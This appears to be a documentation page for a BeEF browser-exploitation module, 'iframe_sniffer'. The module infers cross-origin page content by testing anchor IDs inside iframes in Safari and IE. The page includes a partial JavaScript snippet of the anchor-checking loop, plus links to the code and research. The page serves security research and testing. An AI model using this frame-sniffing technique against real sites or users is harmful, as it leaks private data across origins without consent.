## Summary

* **Objective**: Sniff data from other origins via iframes
* **Authors**: Bart Leppens
* **Browsers**: Safari, IE

* [Code](https://github.com/beefproject/beef/tree/master/modules/misc/iframe_sniffer)

## Internal Working

By using anchors (#) to request cross-origin resources in an iframe, it can leak information based on the presence and absence of elements.

Content can't be directly read with this technique, but data can be inferred from web applications.


```js

      if (typeof LeakyFrame === 'function') {
          new LeakyFrame(inputURL,
            function(frame){
              //check each anchor
              for (var anchor = 0; anchor < arrayOfAnchorsToCheck.length; anchor++){
                if (frame.checkID(arrayOfAnchorsToCheck[anchor])){
                  resultList.push('Exists');
                }
                else{
                  resultList.push('Does not exist');
                }
              }
              frame.remove();

```


## References

https://www.contextis.com/en/blog/framesniffing-against-sharepoint-and-linkedin

(old link, maybe check it on archive.org):
http://www.contextis.co.uk/research/blog/framesniffing/


## Feedback


